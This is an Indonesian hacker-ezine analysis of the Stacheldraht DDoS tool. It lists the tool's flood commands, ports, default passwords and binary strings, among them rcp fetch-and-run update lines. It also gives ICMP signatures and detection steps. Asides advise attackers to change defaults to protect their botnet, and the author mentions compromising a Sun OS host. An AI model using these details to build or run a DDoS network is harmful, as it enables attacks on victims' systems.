@@ -1,0 +1,1120 @@
+
+	____________________   ___ ___ ________   
+	\_   _____/\_   ___ \ /   |   \\_____  \  
+	 |    __)_ /    \  \//    ~    \/   |   \ 
+	 |        \\     \___\    Y    /    |    \
+	/_______  / \______  /\___|_  /\_______  /
+	        \/         \/       \/         \/ 
+
+
+					    .OR.ID
+ECHO-ZINE RELEASE
+       07
+
+Author	:Hilman_hands || hilman_hands@yahoo.com
+Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+"Stacheldraht" Distributed Denial of Service Attack Tool
+
+Pendahuluan
+
+Berikut ini adalah suatu analisa “stacheldraht", suatu tool distributed denial of 
+service (DDOS), yang source code-nya didapat  dari " Tribe Flood Network (TFN)" 
+sebuah tool distributed denial of service juga, dimana stacheldraht ini merupakan 
+peyempurna dari berbagai tool DDos yang datang sebelumnya.[ Catatatan: Sepanjang 
+analisa ini menggunakan nama site, nickname, dan alamat IP yang bukan sebenarnya]
+
+Stacheldraht (dalam bahasa Inggris disebut “barbed wire” dalam bahasa Indonesia 
+disebut "kawat-berduri") mengkombinasikan features antara  " trinoo" distributed 
+denial of service attack tool, dengan TFN yang original. kelebihan lain dari 
+features stacheldraht adalah adanya encryption komunikasi antara attacker dan 
+masters, serta agen dapat meng-update dirinya sendiri secara otomatis.
+
+Untuk informasi lebih jauh tentang trinoo dan TFN dapat dilihat di:
+
+	http://staff.washington.edu/dittrich/misc/trinoo.analysis
+	http://staff.washington.edu/dittrich/misc/tfn.analysis
+
+Pada akhir Juni dan awal Juli 1999, satu atau lebih kelompok  mencoba untuk 
+menginstallasi dan menguji jaringan trinoo (Trinoo Networks) dengan membuat skala 
+jaringan denial of service attack yang sangat luas dengan memanfaatkan jaringan 
+di atas 2000 sistem yang telah di atur sedemikian rupa. Serangan ini melibatkan 
+dan telah diarahkan pada sistem di sekitar bola bumi.
+
+
+Pada akhir  Augustus / awal bulan September 1999, fokus mulai bergeser dari trinoo 
+ke TFN, yang diduga kode originalnya  dibuat oleh Mixter. Kemudian pada akhir 
+September / awal Oktober, suatu program yang kelihatan persis/mirip seperi TFN agen,
+yang kemudian dikenal sebagai "stacheldraht", mulai menunjukkan taringnya pada 
+system-system di Eropa dan Amerika Serikat pada waktu itu. Untuk lebih jelas 
+silakan baca di:
+
+http://www.cert.org/incident_notes/IN-99-04.html
+
+Seperti halnya trinoo, stacheldraht juga terdiri dari program master (handler) dan 
+daemon, atau " bcast" (agen). Terminologi Handler/Agent telah dikembangkan di CERT 
+Distributed System Intruder Tools workshop pada bulan November 1999, dan akan 
+digunakan didalam analisa ini sebagai ganti dari terminology spesipik stacheldraht. 
+Bagi temen-teman yang ingin mengetahui lebih lanjut tentang CERT workshop report 
+bisa di baca di (kalo kata bang Ditrich mah “sangat dianjurkan”, katanya): 
+
+http://www.cert.org/reports/dsit_workshop.pdf
+
+Kalo kita lihat secara seksama, disana terdapat persaingan dalam pembuatan source code  
+DDos attack tool yaitu, antara  DDos attack tool “stacheldraht” dengan  versi “TFN 
+terbaru” buatan Mixter, yaitu:  Tribe Flood Network 2000, atau TFN2K (==mixter 
+gak mau kalah, takut dikira lamer kali…==)yang di release pada tanggal 21 Desember 1999. 
+Untuk lebih jauh mengetahui tentang TFN2K, Lihat di :
+
+	http://packetstorm.securify.com/distributed/
+	http://www.cert.org/advisories/CA-99-17-denial-of-service-tools.html
+
+
+Selain daripada menggunakan features “handler/agent”-nya trinoo, stacheldraht juga
+mempunyai features dari TFN yaitu dengan adanya features distributed network denial 
+of service melalui ICMP flood, SYN flood, dan “smurf” style attacks. Tetapi, tidak 
+seperti halnya dengan TFN dan TFN2K yang original, kode stacheldraht yang di analisa 
+tidak memiliki/berisi (contain) “on demand” root shell bound ke sebuah port TCP. 
+( hal tersebut mungkin saja didasarkan pada kode TFN  lebih awal, dibanding yang 
+telah dibuat publik oleh Mixter di pertengahan tahun 1999).
+
+Salah satu kelemahan dari TFN adalah bahwa koneksi attacker(s)  kepada master(s), 
+yang mengendalikan network adalah dalam format clear-text, dan terlalu terfokus 
+kepada standard TCP attack (session hijacking, RST sniping, dll.).  Stacheldraht 
+memberikan keunggulan dalam menghadapi situasi ini dengan menambahkan suatu 
+encrypting "mirip telnet" (istilah stacheldraht) client.
+
+Stacheldraht agen mula-mula ditemukan dalam format biner pada sejumlah system Solaris 2.x, 
+yang dapat diidentifikasikan dengan adanya exploitasi dari bug buffer overrun di dalam 
+servis-servis RPC " statd", " cmsd" dan " ttdbserverd". 
+
+Makefiles dalam stacheldraht berisi rules untuk Linux dan Solaris, dengan default untuk 
+Linux (walaupun demikian code tersebut tidak  bekerja secara reliable pada linux). Untuk 
+kepentingan analisa ini, semua program telah di-compile dan di jalankan (run) di dalam 
+system Red Hat Linux 6.0. Tetapi sejauh ini, saya hanya mengetahui bahwa Agent hanya 
+bisa berjalan secara maksimal pada system Solaris 2.x.
+
+Satu hal, pernyataan yang mungkin harus diperjelas didalam analisa yang akan kita lakukan, 
+terutama didalam analisa trinoo dan Tribe Flood Network adalah bahwa distributed denial 
+of service attack mempunyai dua phase serangan yaitu “victim” (korban) dan “attackers" 
+(penyerang) hal tersebut digambarkan tergantung pada point of view anda (baca artikel 
+ini sampai selesai kemudian pahami, selanjutnya anda akan mengalami “pencerahan”…he..he..he).
+
+Terdapat sebuah tahap di dalam inisialisasi mass-intrusion, di mana tools yang diotomatkan 
+(agent) digunakan untuk   mengkompromisasikan root dari jarak jauh (remotely) dalam jumlah 
+yang sangat besar ( yaitu, dalam beberapa ratus hingga beberapa ribu ranges) dan distributed 
+denial of service agent ini sudah harus diinstall pada  compromised system (kalo dalam 
+bahasa indonesianya mah “system yang telah disepakati”). Ini adalah primary victim  
+(korban utama)  ( dari sistem berkompromi.) Tidak satupun dari tools distributed denial 
+of service ini yang mempunyai features yang dapat memfasilitasi compromising systems seperti 
+layaknya stacheldraht. (compromising system = system yang telah diatur sedemikian rupa 
+dalam sebuah atau beberapa buah jaringan sracheldraht).
+
+Tahap Mass-Instrusion diikuti oleh phase serangan denial of service yang actual, di mana 
+system-system yang telah dikompromisasikan (compromised systems), yaitu handler-handler 
+dan agen-agennya digunakan untuk melakukan serangan denial of service secara raksasa dan 
+secara terdistribusi terhadap satu atau beberapa server sites.Ini adalah secondary victims 
+(korban kedua)  dari serangan denial of service.
+
+Untuk pendeskripsian tentang metode-metode yang digunakan dalam initial intrusion dan 
+phase-pase dalam men-setup jaringan stacheldraht, anda bisa membacanya dalam analisa 
+jaringan trinoo  (analysis of the trinoo network)  yang sebenarnya artikel tersebut 
+sudah saya susun beberapa waktu lalu (belom dipublikasikan)…..tapi saya ingin melihat 
+dulu antusiasme dari komunitas hacker indonesia tentang Distribute Denial of Service 
+Attack Tools…dan juga mengingat apabila tools DDos ini dapat kita installasi dan berhasil 
+dalam membuat sebuah atau beberapa skala jaringan dengan pengaturan sistem yang diatur 
+sedemikian rupa. Maka akan sangat membahayakan, apabila digunakan oleh orang yang tidak 
+bertanggung jawab. (maka dari itu bacaan ini bukan untuk lamer, newbies, 
+script kiddies, carder………dll…heheheJ) terusin lagi yuk…..J
+
+Catatan : bahwa modifikasi dari source code, bisa dan akan merubah detil dari analisa ini, 
+seperti prompt, passwords, commands, port numbers TCP/UDP, atau metoda serangan yang 
+mendukung, signatures, dan features.
+
+
+The network: client(s)-->handler(s)-->agent(s)-->victim(s)
+
+
+Jaringan Stacheldraht terdiri dari satu atau lebih handler program ("mserv.c") dan satu 
+handler program dapat memiliki banyak set agent (" leaf/td.c"). Penyerang/attacker 
+menggunakan sebuah program encrypting " mirip telnet" untuk menghubungkan  dan berkomunikasi 
+dengan handlers ("telnetc/client.c"). Sebuah jaringan stacheldraht akan terlihat seperti ini:
+
+
+
+
+
+                   +--------+             +--------+
+                   | client |             | client |
+                   +--------+             +--------+
+                       |                      |
+        . . . --+------+---------------+------+----------------+-- . . .
+                |                      |                       |
+                |                      |                       |
+          +-----------+          +-----------+           +-----------+
+          |  handler  |          |  handler  |           |  handler  |
+          +-----------+          +-----------+           +-----------+
+                |                      |                       |
+                |                      |                       |
+. . . ---+------+-----+------------+---+--------+------------+-+-- . . .
+         |            |            |            |            |
+         |            |            |            |            |
+     +-------+    +-------+    +-------+    +-------+    +-------+
+     | agent |    | agent |    | agent |    | agent |    | agent |
+     +-------+    +-------+    +-------+    +-------+    +-------+
+
+
+
+
+Attacker(S) mengendalikan satu atau lebih handlers menggunakan encrypting klien. Masing-Masing 
+handler dapat mengendalikan banyak agent. ( Ada suatu batas internal di dalam" mserv.c" di 
+dalam kodenya mencapai 1000 agen, yang biasanya bisa mencapai 1024. Di tulis dalam 
+code-nya " 1000 sockets are leet0" ). Semua Agen dinstruksikan untuk mengkoordinir 
+sebuah paket serangan terhadap satu atau lebih victim system oleh handler (di dalam kodenya 
+dikenal sebagai " mserver" atau " master server”).
+
+Komunikasi
+
+
+
+	Clients ke handler (s) menggunakan	 :	16660/tcp
+	Handler ke / dari agent(s) menggunakan	 :	65000/tcp, ICMP_ECHOREPLY
+
+
+Tidak sama halnya dengan trinoo, yang menggunakan UDP untuk komunikasi antara handlers dan 
+agen, atau Tribe Flood Network yang original, Yang menggunakan ICMP untuk komunikasi antara 
+handler dan agen, stacheldraht menggunakan TCP dan ICMP untuk melakukan komunikasinya.
+
+
+Pengendali jarak jauh (remote control) jaringan stacheldraht  dapat dilakukan dengan menggunakan 
+sebuah  simple client  yang menggunakan kunci symmetric encryption untuk komunikasi antar dirinya 
+sendiri dan handler. Klien menerima argumentasi tunggal, yang menunjukkan  bahwa handler tersebut 
+perlu hubungan, yang kemudian berhubungan dengan menggunakan  sebuah port TCP ( di dalam kode 
+yang di analisa menggunakan default 16660/tcp).
+
+Untuk attacker, coba lihat contoh berikut ini (jika diberikan kata sandi yang sesuai):
+------------------------------------------------------------------------------------------------
+
+# ./client 192.168.0.1
+    [*] stacheldraht [*] 
+ (c) in 1999 by ...
+
+trying to connect...
+connection established.
+--------------------------------------
+enter the passphrase : sicken
+--------------------------------------
+entering interactive session.
+******************************
+   welcome to stacheldraht    
+******************************
+type .help if you are lame
+
+stacheldraht(status: a!1 d!0)>
+---------------------------------------------------------------------------
+
+
+Prompt ("a!") menunjukkan banyaknya agen yang aktif (a=active) dan prompt ("d!") menunjukkan 
+banyaknya agen yang mati (d=dead) pada saat itu. Gunakan perintah ".help" untuk melihat argument 
+perintah. ( Ok…udah jam 2 pagi gak ada rokok…..pusing…beli dulu ahhhh…..sambil nunggu bobolnya 
+gawang sun os…yang lagi “disapa” dan kalo bisa kita ajak “join” buat percobaan…he..he..he…terusin 
+yuk….artikelnya….J)  sekarang kita lihat argument-argument perintahnya….kalo enggak….bakalan 
+tambah pusing ente……hehe J command set yang didukung yaitu:
+
+---------------------------------------------------------------------------
+stacheldraht(status: a!1 d!0)>.help
+available commands in this version are:
+--------------------------------------------------
+.mtimer   .mudp     .micmp .msyn    .msort  .mping
+.madd     .mlist    .msadd .msrem   .distro .help
+.setusize .setisize .mdie  .sprange .mstop  .killall
+.showdead .showalive
+--------------------------------------------------
+stacheldraht(status: a!1 d!0)>
+---------------------------------------------------------------------------
+
+
+
+Perintah-perintah (commands)
+
+
+.distro	user server
+Instruksikan agen untuk menginstal dan menjalankan new copy dirinya sendiri menggunakan 
+perintah Berkeley "rcp" pada sistem "server", menggunakan account “user” ( e.g., " rcp 
+nixxxer_overrun@server:linux.bin ttymon")
+
+
+
+
+.help
+	Untuk memperlihatkan commands yang didukung
+
+.killall
+	Kills semua agent-agen yang aktif.
+
+.madd ip1[:ip2[:ipN]]
+	Tambahkan IP addresses ke daftar attack victims
+
+.mdie
+	Kirim die request ke semua agent.
+
+.mdos
+	Memulai DoS attack
+
+.micmp ip1[:ip2[:ipN]]
+	Memulai ICMP Flood attack terhadap host yang ditetapkan.
+
+.mlist
+	Daftar IP address dari host yang telah dijadikan sasaran Dos attack pada saat ini.
+
+.mping
+	Ping semua agent (bcast) untuk melihat apakah semuanya aktif (alive).
+
+.msadd
+Menambahkan master server baru (handler) ke dalam daftar (list) servers yang tersedia.
+
+.msort
+Untuk melihat agent (bcast) yang mati/hidup. (kirim ping dan perlihatkan counts/persentase 
+dari agent-agent yang mati/hidup)
+
+.mstop ip1[:ip2[:ipN]]
+.mstop all
+Berhenti melakukan serangan terhadap ip address yang telah ditetapkan, atau berhenti 
+melakukan serangan terhadap semua IP address (“.mstop all”).
+
+.msrem
+Me-removes sebuah master server (handler) dari daftar master server yang tersedia.
+
+
+.msyn ip1[:ip2[:ipN]]
+	Memulai SYN Flood attack terhadap host yang ditetapkan.
+
+.mtimer seconds
+	Set timer untuk durasi penyerangan. (tidak ada pengecekan dalam value ini).
+
+
+.mudp ip1[:ip2[:ipN]]
+Memulai UDP flood attack terhadap host yang ditetapkan (mode emulasi dari DoS trinoo).
+
+.setisize
+Men-set size pengiriman paket ICMP untuk serangan flooding. (maksimal: 1024, defaultnya : 1024).
+
+.setusize
+Men-set size pengiriman paket UDP untuk serangan flooding (maksimal: 1024, Defaultnya: 1024).
+
+
+.showalive
+	Memperlihatkan semua agent yang “hidup” (bcast).
+
+.showdead
+	Memperlihatkan semua agent yang “mati” (bcast).
+
+.sprange lowport-highport
+Men-set port range untuk serangan SYN Flooding (dafault untuk lowport: 0, highport: 140).
+
+
+
+Proteksi Password
+
+
+Setelah koneksi kepada handler menggunakan program klien, Attacker diminta untuk memasukan 
+password. Password ini ( Defaultnya " sicken" di dalam kode yang telah dianalisa) adalah 
+suatu standard crypt() encrypted password, yang kemudian di enkripsi oleh program Blowfish 
+menggunakan passphrase " authentication" sebelum dikirimkan oleh network kepada handler 
+(* semua* komunikasi antara agen dan handler di encrypt terlebih dahulu oleh program Blowfish 
+menggunakan passphrase tersebut.).
+
+Seperti halnya TFN, C macros (" config.h") define values-nya digunakan untuk menyatakan 
+perintah-perintah, penempatan kembali vector argumen ("HIDEME" dan "HIDEKIDS"), untuk 
+merahasiakan nama program, dll.:
+
+
+---------------------------------------------------------------------------
+#ifndef _CONFIG_H
+
+/* user defined values untuk the teletubby flood network */
+
+#define HIDEME "(kswapd)"
+#define HIDEKIDS "httpd"
+#define CHILDS 10
+
+/* sepertinya ini kata sandi, dan disini anda bisa merubahnya */
+
+#define ID_SHELL   1       /* untuk mem-bind rootshell */
+
+#define ID_ADDR  699       /* request penambahan IP untuk server flood */			
+#define  ID_SETPRANGE 2007 /* men-set port range untuk synflood */
+#define   ID_SETUSIZE 2006 /* men-set size udp */
+#define   ID_SETISIZE 2005 /* men-set size ICMP */
+#define    ID_TIMESET 2004 /* men-set waktu untuk flooding */
+#define     ID_DIEREQ 2003 /* request menshutdown master server */
+#define   ID_DISTROIT 2002 /* distro request untuk master server */
+#define ID_REMMSERVER 2001 /* meremove master server */
+#define ID_ADDMSERVER 2000 /* memasukan master server baru */
+#define SPOOF_REPLY 1000   /* spoof test reply master server */
+#define ID_TEST  668       /* men-test master server */
+#define ID_ICMP  1055	   /* untuk ICMP flood */
+#define ID_SENDUDP 2	   /* untuk Udp flood */
+#define ID_SENDSYN 3	   /* untuk syn flood */
+#define ID_SYNPORT 4	   /* untuk men-set port */
+#define ID_STOPIT  5	   /* untuk memberhentikan flooding */
+#define ID_SWITCH  6	   /* untuk mengganti mode spoofing */
+#define ID_ACK     7	   /* untuk me-reply kepada klien */
+
+#define _CONFIG_H
+#endif
+---------------------------------------------------------------------------
+
+
+
+
+
+
+Coba anda lihat script value di atas….!!!! Default tersebut membuka hole kepada orang 
+lain untuk men-take over jaringan stacheldraht yang susah payah anda buat.. (gimana kalo 
+orang lain men-execute command agent……?). Untuk berjaga-jaga agar tidak ada orang lain 
+mengetahui default value yang digunakan dalam script tersebut dan berjaga-jaga agar 
+orang lain tidak meng-execute agent commands, sebaiknya anda merubahnya….!!!
+
+
+Fingerprints
+
+
+
+Seperti di dalam installasi Trinoo dan Tribe Flood Network, metoda yang digunakan untuk 
+menginstallasi handler/agent  stacheldraht sama seperti menginstallasi program yang lain 
+pada suatu compromised sistem Unix, dengan semua option standard untuk menyembunyikan 
+program dan file yang akan di instalasi ( seperti halnya ketika anda menginstalasi 
+“root kits”, “back door”, penggunaan hidden directories, kernel modules, dll.)
+
+Salah satu features yang tidak dimiliki oleh trinoo ataupun TFN adalah kemampuan untuk 
+meng-upgrade agen “on demand”. Features ini “mempekerjakan” perintah Berkeley “rcp" 
+( 514/tcp), menggunakan account yang dicuri dari cache dari beberapa site. On demand,…. 
+semua agen di instruksikan untuk men-delete current program image, keluar dan dapatkan 
+sebuah new copy (baik itu binary linux ataupun  binary Solaris) dari suatu site/account 
+menggunakan " rcp”, mulai menjalankan new image ini dengan " nohup", dan exit.
+
+Untuk mengidentifikasi program di dalam sistem file, terdapat beberapa string yang dapat 
+ dibedakan. 
+
+String-string yang terdapat pada encrypting client ("client") meliputi yang berikut:
+
+
+------------------------------------------------------------------------------
+ . . .
+connection closed.
+usage: ./sclient 
+    [*] stacheldraht [*] 
+ (c) in 1999 by ...
+trying to connect...
+unable to resolv %s
+unable to connect.
+connection established.
+--------------------------------------
+enter the passphrase : 
+authentication
+failed
+authentication failed.
+entering interactive session.
+./0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
+huhu
+ . . .
+------------------------------------------------------------------------------
+
+
+String-string yang terdapat pada handler (“mserv”) meliputi yang berikut:
+
+
+------------------------------------------------------------------------------
+ . . .
+%d.%d.%d.%d
+jbQ4yQaKLbFZc
+* mtimer reached *
+.quit
+exiting...
+you need to stop the packet action first.
+.help
+.version
+[*]stacheldraht[*] mserver version: 1.1
+setusize
+setisize
+mdos
+mping
+mudp
+micmp
+msyn
+mstop
+mtimer
+madd
+mlist
+msort
+msadd
+msrem
+distro
+sprange
+killall
+showdead
+showalive
+add some bcasts mofo.
+killing all active childs...
+usage: .sprange 
+example: .sprange 0-140
+ low port is : %i
+high port is : %i
+request was sent to the network.
+usage: .setusize <=1024)>
+current udp packet size is %ibytes
+udp packet size was set to %i bytes.
+udp packet size is too large.
+usage: .setisize <=1024)>
+current icmp packet size is %ibytes
+icmp packet size was set to %i bytes.
+icmp packet size is too large.
+sending mass die request...
+finished.
+.mudp
+starting trinoo emulation...
+removing useful commands.
+- DONE - 
+available commands in this version are:
+--------------------------------------------------
+.mtimer   .mudp     .micmp .msyn    .msort  .mping
+.madd     .mlist    .msadd .msrem   .distro .help
+.setusize .setisize .mdie  .sprange .mstop  .killall
+.showdead .showalive
+usage: .distro  
+remember  : the distro files need to be executable!
+that means: chmod +x linux.bin , chmod +x sol.bin ;))
+sending distro request to all bcasts....
+      user : %s
+rcp server : 
+unable to resolve - %s
+unable to send distro request.
+request was sent, wait some minutes ;) 
+usage: .msrem 
+removing masterserver - 
+failed.
+usage: .msadd 
+adding masterserver - 
+no packet action at the moment, sir.
+the followings ip(s) are getting packeted...
+--------------------------------------------
+[*] stacheldraht [*] is packeting %d ips
+[*] stacheldraht [*] is packeting 1 ip
+.mstop all
+deleting from packetlist...
+%s - removed.
+%s - skipped.
+restarting packeting routines...
+niggahbitch
+usage: .madd 
+adding to packetlist...
+%s - added.
+usage: .mtimer 
+packet timer was set to %d seconds
+usage: .mstop  or 
+packeting stopped.
+usage: .msyn 
+the net is already packeting.
+mass syn flooding
+%i floodrequests were sent to %i bcasts.
+usage: .micmp 
+mass icmp bombing
+usage: .mudp 
+mass udp bombing
+tR1n00(status: a!%i d!%i)>
+stacheldraht(status: a!%i d!%i)>
+waiting for ping replies...
+total bcasts : %d   - 100%
+alive bcasts : 0   - 0%
+alive bcasts : %d   -  %d%
+dead bcasts  : %d   - %d%
+showing the alive bcasts...
+---------------------------
+alive bcasts: %i
+showing the dead bcasts...
+--------------------------
+dead bcasts: %i
+sorting out all the dead bcasts
+-------------------------------
+%d dead bcasts were sorted out.
+bcasts
+[*]-stacheldraht-[*] - forking in the background...
+%i bcasts were successfully read in.
+3.3.3.3
+spoofworks
+ficken
+authentication
+failed
+******************************
+   welcome to stacheldraht    
+type .help if you are lame
+./0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
+huhu
+[0;35mTribe Flood Network (c) 1999 by 
+[5mMixter
+ . . .
+------------------------------------------------------------------------------
+
+
+String yang terdapat di dalam agen (“td”) meliputi yang berikut:
+
+
+
+------------------------------------------------------------------------------
+
+. . . 
+%d.%d.%d.%d
+ICMP
+Error sending syn packet.
+tc: unknown host
+3.3.3.3
+mservers
+randomsucks
+skillz
+ttymon
+rm -rf %s
+rcp %s@%s:linux.bin %s
+nohup ./%s
+1.1.1.1
+127.0.0.1
+lpsched
+no masterserver config found.
+using default ones.
+available servers: %i - working servers : 0
+[*] stacheldraht [*] installation failed.
+found a working [*] stacheldraht [*] masterserver.
+masterserver is gone, looking for a new one
+sicken
+in.telne
+./0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
+ . . .
+------------------------------------------------------------------------------
+
+
+Ketika masing-masing agen startup, agen-agen tersebut mencoba untuk membaca file 
+configurasi master server, untuk mengetahui manakah handler-hendler yang dapat 
+mengontrolnya. File tersebut adalah daftar IP address, di enkripsi menggunakan 
+Blowfish, dengan suatu passphrase "randomsucks". Kegagalan dalam menemukan suatu 
+file konfigurasi, disebabkan karena ada satu atau lebih default handler IP address 
+yang di-compile ke dalam program (seperti yang di tunjukkan di atas "1.1.1.1" 
+dan "127.0.0.1" this will obviously be changed…..!!!!!….huahhh…).
+
+Setelah agen telah mendeterminisasikan daftar handlers yang potensial, kemudian 
+akan start pada awal daftar handlers dan mengirimkan suatu paket ICMP_ECHOREPLY 
+dengan  suatu ID field yang berisi value 666 dan data field yang berisi string 
+"skillz". Jika master mendapatkan paket ini,  master tersebut akan mengembalikan 
+suatu paket ICMP_ECHOREPLY dengan suatu ID field yang berisi value 667 dan data 
+field yang berisi string " ficken". (handler dan agen akan mengirimkan beberapa 
+paket besar, e.g., >1000 byte. Handler dan agen secara periodikal mengirimkan 
+paket ini>>> 666|skillz / 667|ficken<<< secara bolak balik.
+
+Apabila kita lihat melalui tool "sniffit" (Sniffit adalah packet sniffer and 
+monitoring tool), paket tersebut akan kelihatan seperti ini:
+
+------------------------------------------------------------------------------
+ICMP message id: 10.0.0.1 > 192.168.0.1
+  ICMP type: Echo reply
+ 45 E 00 . 04 . 14 . 01 . 0F . 00 . 00 . 40 @ 01 . E9 . 53 S 0A . 00 . 00 . 01 .
+ C0 . A6 . 00 . 01 . 00 . 00 . B4 . 13 . 02 . 9A . 00 . 00 . 00 . 00 . 00 . 00 .
+ 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 .
+ 73 s 6B k 69 i 6C l 6C l 7A z 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 .
+ 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 .
+ . . . [60 lines of zeros deleted]
+ 00 . 00 . 00 . 00 .
+
+ICMP message id: 192.168.0.1 > 10.0.0.1
+  ICMP type: Echo reply
+ 45 E 00 . 04 . 14 . 04 . F8 . 00 . 00 . 40 @ 01 . E5 . 6A j C0 . A6 . 00 . 01 .
+ 0A . 00 . 00 . 01 . 00 . 00 . CE . 21 ! 02 . 9B . 00 . 00 . 00 . 00 . 00 . 00 .
+ 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 .
+ 66 f 69 i 63 c 6B k 65 e 6E n 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 .
+ 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 .
+ . . . [60 lines of zeros deleted]
+ 00 . 00 . 00 . 00 .
+------------------------------------------------------------------------------
+
+
+
+
+Apabila kita kita lihat melalui tool “ngrep” (Network Grep Tool), akan kelihatan 
+seperti di bawah ini:
+
+
+------------------------------------------------------------------------------
+# ngrep -x "*" icmp
+interface: eth0 (0.0.0.0/0.0.0.0)
+filter: ip and ( icmp )
+Kernel filter, protocol ALL, raw packet socket
+match: *
+#
+I 10.0.0.1 -> 192.168.0.1 0:0
+  02 9a 00 00 00 00 00 00    00 00 00 00 00 00 00 00    ................
+  00 00 00 00 00 00 00 00    73 6b 69 6c 6c 7a 00 00    ........skillz..
+[ 61 lines of zeroes deleted ]
+  00 00 00 00 00 00 00 00    00 00 00 00                ............    
+#
+I 192.168.0.1 -> 10.0.0.1 0:0
+  02 9b 00 00 00 00 00 00    00 00 00 00 00 00 00 00    ................
+  00 00 00 00 00 00 00 00    66 69 63 6b 65 6e 00 00    ........ficken..
+[ 61 lines of zeroes deleted ]
+  00 00 00 00 00 00 00 00    00 00 00 00                ............    
+#
+------------------------------------------------------------------------------
+
+
+" ngrep" adalah Network grep utility yang digunakan untuk menganalisis paket 
+jaringan (“packet sniffer”) lebih mudah untuk digunakan dan outputnya lebih 
+ringkas dibanding dengan " tcpdump" / " tcpshow".
+
+Sebagai tambahan untuk menemukan aktif handler, agen melakukankan suatu test 
+untuk melihat jika jaringan pada agen sedang berjalan (ruuning) dan mengijinkan 
+paket-paket untuk exit dengan source address yang dipalsukan. Hal tersebut 
+dilakukan dengan mengirimkan suatu paket ICMP ECHO dengan sebuah alamat 
+IP palsu " 3.3.3.3", sebuah ID 666, dan alamat IP dari  sistem agen ( yang diperoleh 
+dengan mendapatkan hostname, kemudian me-resolving-nya ke sebuah alamat IP) di 
+dalam data field dari paket  ICMP. 
+
+Jika master menerima paket tersebut, maka master akan me-reply-nya ke alamat IP yang 
+terdapat pada paket tersebut dengan suatu paket ICMP_ECHOREPLY berisi sebuah ID 1000 
+dan kata "spoofworks" di dalam data field (bidang data). Jika agen menerima paket ini, 
+maka agen akan men-sets ke spoof_level 0 ( bisa men-spoof semua alamat IP 32 bit). 
+Jika terjadi time out sebelum menerima suatu paket spoof reply, maka akan men-set-nya 
+ke spoof_level 3 ( hanya bisa men-spoof final octet).
+
+Apabila kita lihat melalui “tcpdump” dan “ngrep” maka paket tersebut akan terlihat 
+seperti di bawah ini:
+
+------------------------------------------------------------------------------
+# tcpdump icmp
+ . . .
+14:15:35.151061 3.3.3.3 > 192.168.0.1: icmp: echo request [tos 0x7]
+14:15:35.177216 192.168.0.1 > 10.0.0.1: icmp: echo reply
+ . . .
+
+# ngrep -x "*" icmp
+interface: eth0 (0.0.0.0/0.0.0.0)
+filter: ip and ( icmp )
+Kernel filter, protocol ALL, raw packet socket
+match: *
+#
+I 3.3.3.3 -> 192.168.0.1 8:0
+  00 00 00 00 00 00 00 00    00 00 00 00 00 00 00 00    ................
+  00 00 00 00 00 00 00 00    31 30 2e 30 2e 30 2e 31    ........10.0.0.1
+  00 00 00 00 00 00 00 00    00 00 00 00 00 00 00 00    ................
+  00 00 00 00 00 00 00 00    00 00 00 00 00 00 00 00    ................
+  00 00 00 00 00 00 00 00    00 00 00 00 00 00 00 00    ................
+  00 00 00 00 00 00 00 00                               ........        
+#
+I 192.168.0.1 -> 10.0.0.1 0:0
+  03 e8 00 00 00 00 00 00    00 00 00 00 00 00 00 00    ................
+  00 00 00 00 00 00 00 00    73 70 6f 6f 66 77 6f 72    ........spoofwor
+  6b 73 00 00 00 00 00 00    00 00 00 00 00 00 00 00    ks..............
+[ 60 lines of zeroes deleted ]
+  00 00 00 00 00 00 00 00    00 00 00 00                ............    
+#
+------------------------------------------------------------------------------
+
+
+Terdapat juga sebuah kode di dalam agen untuk melakukan suatu ID test, mengirimkan 
+suatu paket ICMP_ECHOREPLY dengan suatu ID field value 669, dan string "sicken\n" 
+di dalam data field. Kode ini akan muncul jika agen dikirim suatu paket ICMP_ECHOREPLY 
+dengan sebuah ID field yang berisi value 668. Seandainya anda ingin memeriksa adanya 
+3stacheldraht agen, maka anda dapat memeriksanya dengan sebuah program “gag” 
+(Perl script yang dibuat untuk mendeteksi stacheldraht agents). Apabila menggunakan 
+“ngrep” maka yang akan muncul seperti ini:
+
+
+------------------------------------------------------------------------------
+# ngrep -x "*" icmp
+interface: eth0 (0.0.0.0/0.0.0.0)
+filter: ip and ( icmp )
+Kernel filter, protocol ALL, raw packet socket
+match: *
+#
+I 10.0.0.2 -> 198.162.0.1 0:0
+  02 9c 00 00 67 65 73 75    6e 64 68 65 69 74 21       ....gesundheit! 
+#
+I 198.162.0.1 -> 10.0.0.2 0:0
+  02 9d 00 00 00 00 00 00    00 00 00 00 00 00 00 00    ................
+  00 00 00 00 00 00 00 00    73 69 63 6b 65 6e 0a 00    ........sicken..
+[ 61 lines of zeroes deleted ]
+  00 00 00 00 00 00 00 00    00 00 00 00                ............    
+------------------------------------------------------------------------------
+
+
+Script "gag" bisa juga digunakan seperti halnya “ngrep”. Pertama, buatlah daftar semua 
+sistem yang dicurigai (lakukan scanning menggunakan " nmap" untuk pendeteksian 
+Operating System (OS) dan temukan semua system Solaris dan Linux pada jaringan anda, 
+atau scanlah seluruh jaringan dan temukan semua alamat IP yang aktif). 
+Gunakanlah "Tcpdump" untuk menangkap semua potensial reply yang akan digunakan kemudian. 
+Kemudian gunakanlah "gag". Perhatikan contoh di bawah ini :
+
+
+------------------------------------------------------------------------------
+# tcpdump -s 1500 -w stach.dump 'icmp[4:2] = 669'
+# ./gag -v iplist
+sending packet [668/"gesundheit!"] to 192.168.0.1
+sending packet [668/"gesundheit!"] to 192.168.0.30
+sending packet [668/"gesundheit!"] to 192.168.1.2
+sending packet [668/"gesundheit!"] to 192.168.1.5
+sending packet [668/"gesundheit!"] to 192.168.2.10
+sending packet [668/"gesundheit!"] to 192.168.3.6
